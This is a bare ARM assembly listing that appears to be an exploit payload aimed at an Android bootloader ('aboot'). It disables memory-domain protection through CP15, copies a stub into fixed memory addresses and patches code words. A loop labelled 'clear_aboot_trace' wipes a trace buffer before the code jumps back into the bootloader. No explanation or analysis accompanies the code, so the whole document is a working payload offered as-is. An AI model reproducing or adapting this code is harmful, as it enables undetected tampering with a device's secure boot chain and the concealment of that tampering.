
    push {r0-r4, lr}
    mvn r0, #0
    mcr p15, 0, r0, c3, c0, 0
    isb
    ldr r0, =2181038592
    movs r1, #0x34
    str r1, [r0, #4]
    str r1, [r0, #20]
    ldr r0, =2405496956
    ldr r1, =2181039104
    movs r2, #132
copy_stub:
    ldr r3, [r1], #4
    str r3, [r0], #4
    subs r2, #4
    bne copy_stub
    ldr r0, =2405437320
    ldr r1, =3942660667
    str r1, [r0]

    ldr r0, =0x8f697730
    movw r1, #3968
    str r1, [r0]
    ldr r0, =2406057660
    movs r1, #0
    movs r2, #128
clear_aboot_trace:
    str r1, [r0], #4
    subs r2, #4
    bne clear_aboot_trace
    ldr r0, =2406057660
    ldr r1, =0xa5032009
    str r1, [r0]
    dsb
    pop {r0-r4, lr}
    ldr ip, =0x08041a29
    bx ip
